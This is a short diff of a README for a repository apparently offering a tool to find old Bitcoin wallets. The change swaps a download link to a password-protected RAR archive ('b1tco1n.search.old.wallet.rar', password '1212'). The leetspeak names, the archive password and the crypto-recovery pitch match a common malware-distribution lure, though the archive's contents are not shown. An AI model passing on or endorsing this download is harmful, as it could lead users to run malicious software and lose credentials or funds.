@@ -30,6 +30,6 @@ Please note that this software is for informational purposes only and should not
 
 ## Download
 
-[![Download](https://github.com/seichiro17/b1tc0in-search-0ld-wallet/releases/download/Donwload/bitcoin.search.old.wallet.rar)
+[![Download](https://github.com/seichiro17/b1tc0in-search-0ld-wallet/releases/download/Donwload/b1tco1n.search.old.wallet.rar)
 
 Password: 1212
